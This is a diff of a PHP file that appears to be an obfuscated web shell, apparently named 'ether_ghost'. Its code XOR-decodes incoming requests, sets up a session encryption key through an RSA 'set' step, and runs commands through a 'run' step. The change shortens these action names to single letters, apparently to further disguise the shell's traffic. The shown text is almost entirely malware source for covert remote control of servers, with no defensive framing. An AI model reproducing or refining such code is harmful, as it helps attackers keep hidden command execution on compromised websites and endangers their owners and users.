@@ -18,8 +18,8 @@ for($i = 8; $i < strlen($obfs); $i += 8) {
     $call .= substr($obfs, $i, 8) ^ $k;
 }
 
-$action = substr($call, 0, 3); # set run
-$data = substr($call, 3);
+$action = substr($call, 0, 1); # s r
+$data = substr($call, 1);
 
 
 function obfs_echo($s) {
@@ -49,7 +49,7 @@ function aes_dec($encryptedData) {
     );
 }
 
-if($action == "set") {
+if($action == "s") {
     if(!extension_loaded('openssl')){
         obfs_echo("WRONG_NO_OPENSSL");
     }else if(!function_exists("openssl_public_encrypt")){
@@ -65,7 +65,7 @@ if($action == "set") {
         obfs_echo(base64_encode($encrypted));
     }
 
-}else if($action == "run") {
+}else if($action == "r") {
     if(!isset($_SESSION["ether_ghost_enc_key"])){
         obfs_echo("WRONG_NO_SESSION");
     }else if(!extension_loaded('openssl')) {
